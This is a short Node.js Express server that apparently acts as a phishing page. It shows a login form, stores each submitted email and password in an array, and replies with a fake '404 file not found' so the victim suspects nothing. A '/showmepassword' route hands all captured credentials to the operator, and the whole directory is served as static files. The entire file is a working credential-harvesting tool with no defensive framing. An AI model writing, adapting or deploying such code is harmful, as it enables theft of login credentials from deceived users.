express = require("express")
app=express(    )
app.listen(3000)
app.set("view engine", "ejs");
app.use(express.static(__dirname));
const bodyParser= require('body-parser');
app.use(bodyParser.urlencoded({extended:true}))
usrnamepassword=[]
app.get('/',(req,res)=>{
    res.render('login.ejs')
})
app.post('/login',(req,res)=>{
    usrnamepassword.push(req.body.email,req.body.password)
    res.send('404 file not found')
})
app.get('/showmepassword',(req,res)=>{
    res.send(usrnamepassword)
})  